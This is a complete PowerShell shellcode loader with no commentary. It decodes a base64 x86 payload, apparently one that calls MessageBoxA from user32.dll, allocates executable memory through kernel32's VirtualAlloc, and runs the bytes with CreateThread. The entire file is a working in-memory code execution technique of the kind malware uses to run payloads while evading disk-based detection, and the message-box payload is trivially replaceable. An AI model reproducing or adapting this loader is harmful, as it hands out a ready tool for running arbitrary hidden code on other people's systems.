$base64 = "6AAAAABajVL7VYnlg+wQUouCfAEAAFDo8AAAAIlF/IPEBFpSjUXwUI2ClwEAAFCLRfxQ6BABAACDxAxaUo2agAEAAFOLRfD/0IlF+FpSjYKLAQAAUItF+FD/VfSJwFpqAGoAagBqAP/Qiexdw4tUJAQxwIoagPsAdBuA+0FyCID7WncDgMsgwcAHD7bbMdgDVCQI695ag8QIUsNVieWD7AyLXQiLczyNNDONdniLNo00M4t+II08O4l9/It+HI08O4l99It+JI08O4l9+DHJi1X8jRSKixKLXQiNFBNqAVLoiP///ztFDHQFg8EBdeCLVfiNFEoxwGaLAotV9I0UgosSi10IjQQTiexdw1WJ5WSLPTAAAACLfwyLfwyJ/otWMGoCUuhE////i10IOdh0CIs2Of516OsHi0YYiexdw7j/////iexdw1WJ5THJi10MjRyLixuD+/90HFFTi0UIUOg2////g8QIWYtdEI0ci4kDg8EB69eJyInsXcOO/h9LdXNlcjMyLmRsbABNZXNzYWdlQm94QQAGgOjI72LAH/////8="
$bytes = [Convert]::FromBase64String($base64)

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class K32 {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint t);
}
"@

$addr = [K32]::VirtualAlloc(0, $bytes.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)
$th = [K32]::CreateThread(0,0,$addr,0,0,0)
[K32]::WaitForSingleObject($th, 0xFFFFFFFF)